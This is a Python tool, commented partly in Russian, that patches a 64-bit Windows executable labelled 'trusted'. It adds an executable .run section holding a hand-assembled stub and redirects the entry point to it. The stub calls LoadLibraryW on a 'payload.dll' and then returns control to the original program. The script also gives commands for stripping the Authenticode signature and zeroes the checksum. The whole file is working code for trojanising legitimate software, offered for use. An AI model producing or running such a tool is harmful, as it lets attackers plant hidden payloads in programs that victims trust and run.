"""
PE64 DLL-loader patcher

Usage:
  python pe_patcher.py --trusted trusted.exe --payload-dll payload.dll --out out.exe
  python pe_patcher.py --trusted trusted.exe --payload-dll payload.dll --out out.exe --strict
  python pe_patcher.py --trusted trusted.exe --payload-dll payload.dll --out out.exe --keep-old-run
"""

import argparse
import struct
from pathlib import Path
import pefile


SECTION_NAME  = b".run\x00\x00\x00\x00"
SECTION_CHARS = 0xE0000020

PE64_MAGIC    = 0x20B
MACHINE_AMD64 = 0x8664

_OPT_OFF_SIZEOFIMAGE   = 56
_OPT_OFF_SIZEOFHEADERS = 60
_OPT_OFF_DATADIR       = 112
_DATADIR_ENTRY_SIZE    = 8
_DATADIR_SECURITY_IDX  = 4



def align_up(value: int, alignment: int) -> int:
    """Универсальная функция выравнивания вверх (align_up) работает для любого положительного выравнивания, а не только для степеней двойки."""
    if alignment <= 0:
        raise ValueError(f"Выравнивание должно быть > 0, получено {alignment}")
    return ((value + alignment - 1) // alignment) * alignment


def write_u16(buf: bytearray, off: int, value: int) -> None:
    buf[off:off + 2] = int(value).to_bytes(2, "little")


def write_u32(buf: bytearray, off: int, value: int) -> None:
    buf[off:off + 4] = int(value).to_bytes(4, "little")


def read_u16(buf: (bytearray | bytes), off: int) -> int:
    return struct.unpack_from("<H", buf, off)[0]


def read_u32(buf: (bytearray | bytes), off: int) -> int:
    return struct.unpack_from("<I", buf, off)[0]


def rel32(target_rva: int, next_ip_rva: int) -> bytes:
    delta = target_rva - next_ip_rva
    if not -(2 ** 31) <= delta < 2 ** 31:
        raise ValueError(
            f"rel32 overflow: delta={delta:#x}  "
            f"(target={target_rva:#x}, next_ip={next_ip_rva:#x})"
        )
    return int(delta).to_bytes(4, "little", signed=True)



def assert_pe64(pe: pefile.PE) -> None:
    """Завершить работу, если файл не является образом PE64/AMD64."""
    machine = pe.FILE_HEADER.Machine
    magic   = pe.OPTIONAL_HEADER.Magic

    if machine != MACHINE_AMD64:
        known = {0x14C: "x86/PE32", 0x1C0: "ARM", 0xAA64: "ARM64",
                 0x200: "IA-64", 0x5032: "RISC-V32"}
        label = known.get(machine, "unknown")
        raise SystemExit(
            f"[!] Not PE64: Machine=0x{machine:04X} ({label}). "
            f"Поддерживается только AMD64 (0x{MACHINE_AMD64:04X})."
        )
    if magic != PE64_MAGIC:
        raise SystemExit(
            f"[!] Не PE64: OptionalHeader.Magic=0x{magic:04X}. "
            f"Ожидалось 0x{PE64_MAGIC:04X} (PE32+). "
            f"PE32 (0x10B) и ROM (0x107) не поддерживаются."
        )



def find_section(pe: pefile.PE, name: str):
    needle = name.encode("ascii")
    for sec in pe.sections:
        if sec.Name.rstrip(b"\x00") == needle:
            return sec
    return None


def sections_by_rva(pe: pefile.PE) -> list:
    return sorted(pe.sections, key=lambda s: s.VirtualAddress)


def sections_by_raw(pe: pefile.PE) -> list:
    return sorted(
        (s for s in pe.sections if s.PointerToRawData),
        key=lambda s: s.PointerToRawData,
    )


def _sec_rva_end(sec) -> int:
    return sec.VirtualAddress + max(sec.Misc_VirtualSize, sec.SizeOfRawData, 1)


def _sec_raw_end(sec) -> int:
    return sec.PointerToRawData + sec.SizeOfRawData


def max_rva_end(pe: pefile.PE) -> int:
    """Истинное завершение последнего раздела виртуального адресного пространства."""
    return max(_sec_rva_end(s) for s in pe.sections)


def max_raw_end(pe: pefile.PE) -> int:
    """Истинный конец последнего раздела в файле (по исходному смещению + размеру)."""
    raws = [s for s in pe.sections if s.PointerToRawData]
    if not raws:
        raise RuntimeError("Разделы с исходными данными не найдены.")
    return max(_sec_raw_end(s) for s in raws)


def check_rva_overlaps(pe: pefile.PE) -> list[str]:
    issues = []
    for i, a in enumerate(sections_by_rva(pe)):
        for b in sections_by_rva(pe)[i + 1:]:
            a_end = _sec_rva_end(a)
            if a_end > b.VirtualAddress:
                issues.append(
                    f"Перекрытие RVA: {a.Name!r} заканчивается 0x{a_end:X} "
                    f"> {b.Name!r} starts 0x{b.VirtualAddress:X}"
                )
    return issues


def check_raw_overlaps(pe: pefile.PE) -> list[str]:
    issues = []
    sorted_secs = sections_by_raw(pe)
    for i in range(len(sorted_secs) - 1):
        a = sorted_secs[i]
        b = sorted_secs[i + 1]
        a_end = _sec_raw_end(a)
        if a_end > b.PointerToRawData:
            issues.append(
                f"RAW overlap: {a.Name!r} ends 0x{a_end:X} "
                f"> {b.Name!r} starts 0x{b.PointerToRawData:X}"
            )
    return issues



def get_cert_table_range(pe: pefile.PE) -> tuple[int | None, int | None]:
    """
    Возвращает (file_offset, size) таблицы сертификатов Win32 или (None, None).

    Примечание: DATA_DIRECTORY[SECURITY].VirtualAddress — это *смещение файла*, а не RVA.
    """
    try:
        d = pe.OPTIONAL_HEADER.DATA_DIRECTORY[_DATADIR_SECURITY_IDX]
        if d.VirtualAddress and d.Size:
            return d.VirtualAddress, d.Size
    except (IndexError, AttributeError):
        pass
    return None, None


def get_overlay_range(pe: pefile.PE, file_size: int) -> tuple[int, int] | None:
    """Возвращает (начало, конец) данных наложения или None, если данных нет."""
    cert_start, cert_size = get_cert_table_range(pe)
    try:
        raw_end = max_raw_end(pe)
    except RuntimeError:
        return None

    if cert_start and cert_start <= raw_end + 1:
        after_cert = cert_start + cert_size
        if after_cert < file_size:
            return after_cert, file_size
        return None

    if raw_end < file_size:
        end = cert_start if (cert_start and cert_start > raw_end) else file_size
        return raw_end, end

    return None



def find_iat_rva(pe: pefile.PE, func_name: str = "LoadLibraryW") -> tuple | None:
    image_base = pe.OPTIONAL_HEADER.ImageBase
    target     = func_name.encode("ascii")

    if not hasattr(pe, "DIRECTORY_ENTRY_IMPORT"):
        return None

    for entry in pe.DIRECTORY_ENTRY_IMPORT:
        dll = entry.dll.decode(errors="replace")
        for imp in entry.imports:
            if imp.name and imp.name == target:
                return imp.address - image_base, dll
    return None



def build_loader_stub(section_rva: int, loadlibrary_iat_rva: int,
                      old_oep_rva: int, dll_path: Path) -> bytearray:
    """
    x86-64 stub layout (shadow-space safe, follows MS x64 ABI):

        sub  rsp, 28h                ; выделить теневое пространство + выровнять стек
        lea  rcx, [rip + dll_path]   ; arg1 = путь к DLL-библиотеке
        call qword ptr [rip + IAT]   ; LoadLibraryW(dll_path)
        add  rsp, 28h
        jmp  old_oep                 ; передача исходной точке входа
        ; ... UTF-16LE DLL path ...
    """
    dll_utf16 = str(dll_path).encode("utf-16le") + b"\x00\x00"

    code = bytearray()

    code += bytes([0x48, 0x83, 0xEC, 0x28])

    lea_off = len(code)
    code += bytes([0x48, 0x8D, 0x0D]) + b"\x00\x00\x00\x00"

    call_off = len(code)
    code += bytes([0xFF, 0x15]) + b"\x00\x00\x00\x00"

    code += bytes([0x48, 0x83, 0xC4, 0x28])

    jmp_off = len(code)
    code += bytes([0xE9]) + b"\x00\x00\x00\x00"

    path_off = len(code)
    code += dll_utf16

    lea_next = section_rva + lea_off + 7
    path_rva = section_rva + path_off
    code[lea_off + 3: lea_off + 7] = rel32(path_rva, lea_next)

    call_next = section_rva + call_off + 6
    code[call_off + 2: call_off + 6] = rel32(loadlibrary_iat_rva, call_next)

    jmp_next = section_rva + jmp_off + 5
    code[jmp_off + 1: jmp_off + 5] = rel32(old_oep_rva, jmp_next)

    return code



def expand_headers(data: bytearray, pe: pefile.PE) -> tuple[bytearray, int]:
    """
    Освободите место для еще одного IMAGE_SECTION_HEADER, вставив один блок нулей FileAlignment
    непосредственно перед исходными данными первого раздела.

    Updates in-place:
      • SizeOfHeaders  (+= shift)
      • PointerToRawData for every section whose raw data was moved
      • Security directory file offset (it is a file offset, not an RVA)

    Returns (modified_data, shift).
    """
    file_align = pe.OPTIONAL_HEADER.FileAlignment
    shift      = file_align   

    first_raw = min(s.PointerToRawData for s in pe.sections if s.PointerToRawData)

    data[first_raw:first_raw] = b"\x00" * shift

    e_lfanew   = read_u32(data, 0x3C)
    opt_offset = e_lfanew + 4 + 20   

    old_soh = read_u32(data, opt_offset + _OPT_OFF_SIZEOFHEADERS)
    write_u32(data, opt_offset + _OPT_OFF_SIZEOFHEADERS, old_soh + shift)

    num_sections = read_u16(data, e_lfanew + 4 + 2)
    opt_hdr_size = read_u16(data, e_lfanew + 4 + 16)
    first_sec_off = e_lfanew + 4 + 20 + opt_hdr_size

    for i in range(num_sections):
        sec_off = first_sec_off + i * 40
        ptr_raw = read_u32(data, sec_off + 20)
        if ptr_raw >= first_raw:
            write_u32(data, sec_off + 20, ptr_raw + shift)

    cert_dir_off = opt_offset + _OPT_OFF_DATADIR + _DATADIR_SECURITY_IDX * _DATADIR_ENTRY_SIZE
    cert_va = read_u32(data, cert_dir_off)
    cert_sz = read_u32(data, cert_dir_off + 4)
    if cert_va and cert_sz and cert_va >= first_raw:
        write_u32(data, cert_dir_off, cert_va + shift)

    return data, shift



def add_or_reuse_run_section(
    data: bytearray,
    pe: pefile.PE,
    min_size: int,
    keep_old_run: bool,
    strict: bool,
) -> tuple[int, int, int, int, bool, bytearray]:
    """
    Returns (run_rva, run_raw, raw_size, virtual_size, was_added, data).
    Может изменять *данные* на месте (расширение заголовка) и повторно анализировать *pe* внутри системы.
    """
    file_align = pe.OPTIONAL_HEADER.FileAlignment
    sec_align  = pe.OPTIONAL_HEADER.SectionAlignment

    run_sec = find_section(pe, ".run")

    if run_sec:
        if not keep_old_run:
            raise SystemExit(
                "[!] Раздел .run уже существует в доверенном EXE-файле. "
                "Передайте параметр --keep-old-run для повторного использования. "
                "В режиме --strict этот раздел не должен существовать."
            )

        max_va  = max(s.VirtualAddress    for s in pe.sections)
        max_ptr = max(
            (s.PointerToRawData for s in pe.sections if s.PointerToRawData),
            default=0,
        )
        if run_sec.VirtualAddress != max_va:
            raise SystemExit(
                "[!] .run не является последним разделом от RVA "
                f"(0x{run_sec.VirtualAddress:X} != max 0x{max_va:X}). "
                "Повторное использование небезопасно."
            )
        if run_sec.PointerToRawData != max_ptr:
            raise SystemExit(
                "[!] .run не является последним разделом по смещению RAW "
                f"(0x{run_sec.PointerToRawData:X} != max 0x{max_ptr:X}). "
                "Повторное использование небезопасно."
            )

        raw_size     = align_up(max(min_size, run_sec.SizeOfRawData, 0x1000), file_align)
        virtual_size = align_up(max(min_size, run_sec.Misc_VirtualSize, 0x1000), sec_align)

        sec_hdr_off = run_sec.get_file_offset()
        write_u32(data, sec_hdr_off + 8,  virtual_size)   
        write_u32(data, sec_hdr_off + 16, raw_size)        
        write_u32(data, sec_hdr_off + 36, SECTION_CHARS)   

        return (run_sec.VirtualAddress, run_sec.PointerToRawData,
                raw_size, virtual_size, False, data)

    n_sections   = pe.FILE_HEADER.NumberOfSections
    opt_hdr_size = pe.FILE_HEADER.SizeOfOptionalHeader
    e_lfanew     = pe.DOS_HEADER.e_lfanew

    first_sec_off = e_lfanew + 4 + 20 + opt_hdr_size
    new_sec_off   = first_sec_off + n_sections * 40          

    soh       = pe.OPTIONAL_HEADER.SizeOfHeaders
    first_raw = min(s.PointerToRawData for s in pe.sections if s.PointerToRawData)

    need_hdr_space = (new_sec_off + 40 > soh) or (new_sec_off + 40 > first_raw)

    if need_hdr_space:
        if strict:
            raise SystemExit(
                f"[!] STRICT: Нет места для нового заголовка раздела. "
                f"new_sec_off+40=0x{new_sec_off+40:X}, "
                f"SizeOfHeaders=0x{soh:X}, first_raw=0x{first_raw:X}. "
                f"Запустите повторно без параметра --strict для автоматического развертывания."
            )
        print(f"[~] Нет места для заголовка раздела — "
              f"Расширение заголовков с помощью FileAlignment (0x{file_align:X} bytes) ...")

        data, _shift = expand_headers(data, pe)

        pe = pefile.PE(data=bytes(data), fast_load=False)
        pe.parse_data_directories()

        e_lfanew     = pe.DOS_HEADER.e_lfanew
        opt_hdr_size = pe.FILE_HEADER.SizeOfOptionalHeader
        n_sections   = pe.FILE_HEADER.NumberOfSections
        first_sec_off = e_lfanew + 4 + 20 + opt_hdr_size
        new_sec_off   = first_sec_off + n_sections * 40
        soh           = pe.OPTIONAL_HEADER.SizeOfHeaders
        first_raw     = min(s.PointerToRawData for s in pe.sections if s.PointerToRawData)
        file_align    = pe.OPTIONAL_HEADER.FileAlignment
        sec_align     = pe.OPTIONAL_HEADER.SectionAlignment

        if (new_sec_off + 40 > soh) or (new_sec_off + 40 > first_raw):
            raise RuntimeError(
                "После расширения по-прежнему нет места для заголовка раздела. "
                "Структура PE-файла слишком ограничена — используйте редактор PE-файлов."
            )

    run_rva  = align_up(max_rva_end(pe), sec_align)
    run_raw  = align_up(max_raw_end(pe), file_align)

    raw_size     = align_up(max(min_size, 0x1000), file_align)
    virtual_size = align_up(max(min_size, 0x1000), sec_align)

    file_size  = len(data)
    cert_start, cert_size = get_cert_table_range(pe)
    overlay    = get_overlay_range(pe, file_size)

    if cert_start:
        cert_end = cert_start + cert_size
        if run_raw < cert_end and run_raw + raw_size > cert_start:
            raise SystemExit(
                f"[!] .run raw range [0x{run_raw:X}..0x{run_raw+raw_size:X}) "
                f"would overlap certificate table [0x{cert_start:X}..0x{cert_end:X}). "
                f"Strip the signature first (e.g. signtool remove /s trusted.exe)."
            )

    if overlay:
        ov_s, ov_e = overlay
        if run_raw < ov_e and run_raw + raw_size > ov_s:
            msg = (f"[!] .run raw range [0x{run_raw:X}..0x{run_raw+raw_size:X}) "
                   f"overlaps overlay [0x{ov_s:X}..0x{ov_e:X}).")
            if strict:
                raise SystemExit(f"[!] STRICT: {msg}")
            print(f"[!] WARNING: {msg}  Overlay will be overwritten.")

    data[new_sec_off: new_sec_off + 8]  = SECTION_NAME[:8]
    write_u32(data, new_sec_off + 8,  virtual_size)   
    write_u32(data, new_sec_off + 12, run_rva)         
    write_u32(data, new_sec_off + 16, raw_size)        
    write_u32(data, new_sec_off + 20, run_raw)         
    write_u32(data, new_sec_off + 24, 0)               
    write_u32(data, new_sec_off + 28, 0)               
    write_u16(data, new_sec_off + 32, 0)               
    write_u16(data, new_sec_off + 34, 0)              
    write_u32(data, new_sec_off + 36, SECTION_CHARS)   

    num_sec_fld = e_lfanew + 4 + 2
    write_u16(data, num_sec_fld, n_sections + 1)

    return run_rva, run_raw, raw_size, virtual_size, True, data



def patch_optional_header(
    data: bytearray,
    pe: pefile.PE,
    new_entry_rva: int,
    run_rva: int,
    virtual_size: int,
) -> tuple[int, int, int]:
    sec_align = pe.OPTIONAL_HEADER.SectionAlignment

    aep_off = pe.OPTIONAL_HEADER.get_field_absolute_offset("AddressOfEntryPoint")
    old_oep = pe.OPTIONAL_HEADER.AddressOfEntryPoint
    write_u32(data, aep_off, new_entry_rva)

    required = align_up(run_rva + virtual_size, sec_align)
    soi_off  = pe.OPTIONAL_HEADER.get_field_absolute_offset("SizeOfImage")
    old_soi  = pe.OPTIONAL_HEADER.SizeOfImage
    if old_soi < required:
        write_u32(data, soi_off, required)

    try:
        write_u32(data, pe.OPTIONAL_HEADER.get_field_absolute_offset("CheckSum"), 0)
    except Exception:
        pass

    return old_oep, old_soi, required



def verify_not_broken(
    out_path: Path,
    expected_entry_rva: int,
    expected_size_image: int,
) -> tuple[pefile.PE, object]:
    raw = out_path.read_bytes()

    if raw[:2] != b"MZ":
        raise RuntimeError("Вывод не начинается с сигнатуры MZ.")

    pe = pefile.PE(str(out_path))

    if pe.FILE_HEADER.Machine != MACHINE_AMD64:
        raise RuntimeError(f"Machine changed to 0x{pe.FILE_HEADER.Machine:04X}")
    if pe.OPTIONAL_HEADER.Magic != PE64_MAGIC:
        raise RuntimeError(f"OptionalHeader.Magic changed to 0x{pe.OPTIONAL_HEADER.Magic:04X}")

    if pe.FILE_HEADER.NumberOfSections != len(pe.sections):
        raise RuntimeError(
            f"NumberOfSections field={pe.FILE_HEADER.NumberOfSections} "
            f"but pefile parsed {len(pe.sections)} sections"
        )

    issues = check_rva_overlaps(pe) + check_raw_overlaps(pe)
    if issues:
        for msg in issues:
            print(f"[!] VERIFY OVERLAP: {msg}")
        raise RuntimeError("Section overlaps detected in output file")

    aep = pe.OPTIONAL_HEADER.AddressOfEntryPoint
    if aep == 0:
        raise RuntimeError("AddressOfEntryPoint is 0")
    if aep != expected_entry_rva:
        raise RuntimeError(
            f"AddressOfEntryPoint=0x{aep:08X} != expected 0x{expected_entry_rva:08X}"
        )

    run_sec = find_section(pe, ".run")
    if not run_sec:
        raise RuntimeError(".run section not found in output file")
    if run_sec.SizeOfRawData == 0 or run_sec.Misc_VirtualSize == 0:
        raise RuntimeError(".run section has zero size")
    if not (run_sec.Characteristics & 0x20000000):   
        raise RuntimeError(".run section does not have MEM_EXECUTE characteristic")

    run_va_end = run_sec.VirtualAddress + run_sec.Misc_VirtualSize
    if not (run_sec.VirtualAddress <= aep < run_va_end):
        raise RuntimeError(
            f"EntryPoint 0x{aep:08X} is outside .run "
            f"[0x{run_sec.VirtualAddress:08X}..0x{run_va_end:08X})"
        )

    if pe.OPTIONAL_HEADER.SizeOfImage < expected_size_image:
        raise RuntimeError(
            f"SizeOfImage=0x{pe.OPTIONAL_HEADER.SizeOfImage:08X} "
            f"< expected 0x{expected_size_image:08X}"
        )

    try:
        pe_full = pefile.PE(str(out_path), fast_load=False)
        pe_full.parse_data_directories()
        if not hasattr(pe_full, "DIRECTORY_ENTRY_IMPORT"):
            raise RuntimeError("Import directory missing or unreadable")
        _ = [entry.dll for entry in pe_full.DIRECTORY_ENTRY_IMPORT]
    except RuntimeError:
        raise
    except Exception as exc:
        raise RuntimeError(f"Import table unreadable: {exc}") from exc

    return pe, run_sec



def print_report(
    pe: pefile.PE,
    old_oep: int,
    new_oep: int,
    file_size: int,
    required_size_image: int,
) -> None:
    oh = pe.OPTIONAL_HEADER
    fh = pe.FILE_HEADER

    w = 66
    print("=" * w)
    print("  PE64 PATCH DIAGNOSTIC REPORT")
    print("=" * w)
    print(f"  Machine          : 0x{fh.Machine:04X}"
          f"  ({'AMD64 ✓' if fh.Machine == MACHINE_AMD64 else 'NOT AMD64 ✗'})")
    print(f"  Magic            : 0x{oh.Magic:04X}"
          f"  ({'PE32+ ✓' if oh.Magic == PE64_MAGIC else 'NOT PE32+ ✗'})")
    print(f"  FileAlignment    : 0x{oh.FileAlignment:08X}"
          f"  ({'power-of-2 ✓' if oh.FileAlignment and not oh.FileAlignment & (oh.FileAlignment-1) else 'NOT power-of-2 !'})")
    print(f"  SectionAlignment : 0x{oh.SectionAlignment:08X}"
          f"  ({'power-of-2 ✓' if oh.SectionAlignment and not oh.SectionAlignment & (oh.SectionAlignment-1) else 'NOT power-of-2 !'})")
    print(f"  Old EntryPoint   : 0x{old_oep:08X}")
    print(f"  New EntryPoint   : 0x{new_oep:08X}")
    print()

    hdr = f"  {'Name':<12}  {'RVA':>10}  {'VSize':>8}  {'RAW':>10}  {'RawSz':>8}  Characteristics"
    print(hdr)
    print("  " + "-" * (len(hdr) - 2))
    for sec in sections_by_rva(pe):
        name = sec.Name.rstrip(b"\x00").decode(errors="replace")
        print(f"  {name:<12}  0x{sec.VirtualAddress:08X}  "
              f"0x{sec.Misc_VirtualSize:06X}  "
              f"0x{sec.PointerToRawData:08X}  "
              f"0x{sec.SizeOfRawData:06X}  "
              f"0x{sec.Characteristics:08X}")
    print()

    overlay = get_overlay_range(pe, file_size)
    if overlay:
        ov_s, ov_e = overlay
        print(f"  Overlay          : 0x{ov_s:08X} .. 0x{ov_e:08X}"
              f"  ({ov_e - ov_s} bytes)")
    else:
        print("  Overlay          : none")

    cert_start, cert_size = get_cert_table_range(pe)
    if cert_start:
        print(f"  Cert table       : 0x{cert_start:08X} .. 0x{cert_start+cert_size:08X}"
              f"  ({cert_size} bytes)")
    else:
        print("  Cert table       : none")

    print()
    print(f"  Calc SizeOfImage : 0x{required_size_image:08X}")
    print(f"  Final SizeOfImage: 0x{oh.SizeOfImage:08X}")
    print("=" * w)



def strict_preflight(pe: pefile.PE, data: bytearray) -> None:
    """Дополнительные проверки включаются параметром --strict. Любая ошибка является критической."""

    errors: list[str] = []

    errors += check_rva_overlaps(pe)
    errors += check_raw_overlaps(pe)

    fa = pe.OPTIONAL_HEADER.FileAlignment
    sa = pe.OPTIONAL_HEADER.SectionAlignment
    if fa == 0 or fa & (fa - 1):
        errors.append(f"FileAlignment=0x{fa:X} is not a power of two")
    if sa == 0 or sa & (sa - 1):
        errors.append(f"SectionAlignment=0x{sa:X} is not a power of two")
    if fa > sa:
        errors.append(
            f"FileAlignment (0x{fa:X}) > SectionAlignment (0x{sa:X}) — "
            "violates PE spec"
        )

    by_rva = sections_by_rva(pe)
    if by_rva != list(pe.sections):
        errors.append("В таблице разделов разделы не упорядочены по виртуальному адресу.")

    if find_section(pe, ".run"):
        errors.append("Раздел .run уже присутствует — патч перезапишет его.")

    overlay = get_overlay_range(pe, len(data))
    if overlay:
        errors.append(
            f"File has overlay at 0x{overlay[0]:X}..0x{overlay[1]:X} "
            f"({overlay[1]-overlay[0]} bytes)"
        )

    cert_start, cert_size = get_cert_table_range(pe)
    if cert_start:
        errors.append(
            f"File has Authenticode certificate table at file offset "
            f"0x{cert_start:X} (size 0x{cert_size:X}). "
            f"Выполните удаление подписи с помощью: signtool remove /s trusted.exe  "
            f"or: python -c \"import pefile; p=pefile.PE('trusted.exe'); "
            f"p.OPTIONAL_HEADER.DATA_DIRECTORY[4].VirtualAddress=0; "
            f"p.OPTIONAL_HEADER.DATA_DIRECTORY[4].Size=0; p.write('trusted.exe')\""
        )

    if errors:
        print("[!] STRICT mode — pre-flight failures:")
        for e in errors:
            print(f"    • {e}")
        raise SystemExit("[!] Aborted due to --strict violations.")



def main() -> None:
    ap = argparse.ArgumentParser(
        description=(
            "Patch a PE64 trusted EXE: inject a .run loader section that calls "
            "LoadLibraryW(payload.dll) then jumps to the original OEP."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  %(prog)s --trusted trusted.exe --payload-dll payload.dll --out patched.exe\n"
            "  %(prog)s --trusted trusted.exe --payload-dll payload.dll --out patched.exe --strict\n"
            "  %(prog)s --trusted trusted.exe --payload-dll payload.dll --out patched.exe --keep-old-run\n"
        ),
    )
    ap.add_argument("--trusted",      required=True,
                    help="Path to a PE64 trusted.exe (must import LoadLibraryW)")
    ap.add_argument("--payload-dll",  required=True,
                    help="Full absolute path written into the loader stub (passed to LoadLibraryW)")
    ap.add_argument("--out",          required=True,
                    help="Output path for the patched EXE")
    ap.add_argument("--keep-old-run", action="store_true",
                    help="Reuse an existing .run section (must be the last section by RVA and RAW)")
    ap.add_argument("--strict",       action="store_true",
                    help=(
                        "Fail on: overlay, certificate table, unsorted sections, "
                        "existing .run, non-power-of-two alignment, no header room"
                    ))
    args = ap.parse_args()

    trusted = Path(args.trusted).resolve()
    payload = Path(args.payload_dll).resolve()
    out     = Path(args.out).resolve()
    if out.suffix.lower() != ".exe":
        out = out.with_suffix(".exe")

    if not trusted.exists():
        raise SystemExit(f"[!] trusted.exe not found: {trusted}")
    if not payload.exists():
        raise SystemExit(f"[!] payload.dll not found: {payload}")

    data = bytearray(trusted.read_bytes())
    if data[:2] != b"MZ":
        raise SystemExit("[!] Not a PE file (no MZ signature)")

    pe = pefile.PE(data=bytes(data), fast_load=False)
    pe.parse_data_directories()

    assert_pe64(pe)

    if args.strict:
        strict_preflight(pe, data)

    old_oep = pe.OPTIONAL_HEADER.AddressOfEntryPoint

    iat_info = find_iat_rva(pe, "LoadLibraryW")
    if not iat_info:
        raise SystemExit(
            "[!] LoadLibraryW not found in IAT.\n"
            "    Make sure the trusted EXE imports it (directly or via kernel32.dll)."
        )
    loadlibrary_iat_rva, iat_dll = iat_info

    temp_stub = build_loader_stub(
        section_rva=0x1000,
        loadlibrary_iat_rva=0x2000,
        old_oep_rva=0x3000,
        dll_path=payload,
    )
    min_size = align_up(len(temp_stub), pe.OPTIONAL_HEADER.FileAlignment)

    run_rva, run_raw, raw_size, virtual_size, added, data = add_or_reuse_run_section(
        data, pe,
        min_size=min_size,
        keep_old_run=args.keep_old_run,
        strict=args.strict,
    )

    pe = pefile.PE(data=bytes(data), fast_load=False)
    pe.parse_data_directories()

    stub = build_loader_stub(
        section_rva=run_rva,
        loadlibrary_iat_rva=loadlibrary_iat_rva,
        old_oep_rva=old_oep,
        dll_path=payload,
    )
    if len(stub) > raw_size:
        raise RuntimeError(
            f"Loader stub too large: 0x{len(stub):X} > raw_size 0x{raw_size:X}"
        )

    need_size = run_raw + raw_size
    if len(data) < need_size:
        data += b"\x00" * (need_size - len(data))

    data[run_raw: run_raw + raw_size] = b"\x00" * raw_size
    data[run_raw: run_raw + len(stub)] = stub

    _, old_size_image, required_size_image = patch_optional_header(
        data, pe,
        new_entry_rva=run_rva,
        run_rva=run_rva,
        virtual_size=virtual_size,
    )

    out.write_bytes(data)

    final_pe, final_run = verify_not_broken(
        out,
        expected_entry_rva=run_rva,
        expected_size_image=required_size_image,
    )


    print_report(final_pe, old_oep, run_rva, len(data), required_size_image)
    print()

    # ── summary ───────────────────────────────────────────────────────────────
    print("[+] Patch successful")
    print(f"    Input         : {trusted}")
    print(f"    Payload DLL   : {payload}")
    print(f"    Output        : {out}")
    print()
    print(f"    Old OEP RVA   : 0x{old_oep:08X}")
    print(f"    New OEP RVA   : 0x{run_rva:08X}  (→ .run stub)")
    print(f"    LoadLibraryW  : 0x{loadlibrary_iat_rva:08X}  ({iat_dll})")
    print()
    print(f"    .run added    : {added}")
    print(f"    .run RVA      : 0x{run_rva:08X}")
    print(f"    .run RAW      : 0x{run_raw:08X}")
    print(f"    .run raw sz   : 0x{raw_size:08X}")
    print(f"    .run virt sz  : 0x{virtual_size:08X}")
    print(f"    .run chars    : 0x{final_run.Characteristics:08X}")
    print()
    print(f"    Old SizeOfImg : 0x{old_size_image:08X}")
    print(f"    New SizeOfImg : 0x{final_pe.OPTIONAL_HEADER.SizeOfImage:08X}")
    print()
    print("[+] Next step:")
    print(f'GooD JOb"')
    print(f'    "{out}"')


if __name__ == "__main__":
    main()
